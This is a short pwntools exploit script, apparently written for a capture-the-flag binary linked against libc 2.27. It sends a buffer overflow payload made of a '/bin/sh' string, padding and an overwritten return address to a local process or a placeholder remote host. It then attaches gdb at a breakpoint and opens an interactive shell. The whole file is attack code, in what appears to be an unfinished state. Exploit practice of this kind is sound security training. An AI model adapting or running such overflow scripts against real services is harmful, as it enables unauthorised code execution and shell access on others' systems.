#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context(arch="amd64",os="linux")

def conn():
    if args.B:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    
    vuln_addr = 0x4004ED

    payload = b'/bin/sh\x00' + b"A"*8 + p64(vuln_addr)

    r.send(payload)
    
    break_addr = 0x400503

    gdb_script = f"""
    b *{break_addr}
    c
    """

    gdb.attach(r,gdbscript=gdb_script)

    pause()

    r.interactive()


if __name__ == "__main__":
    main()
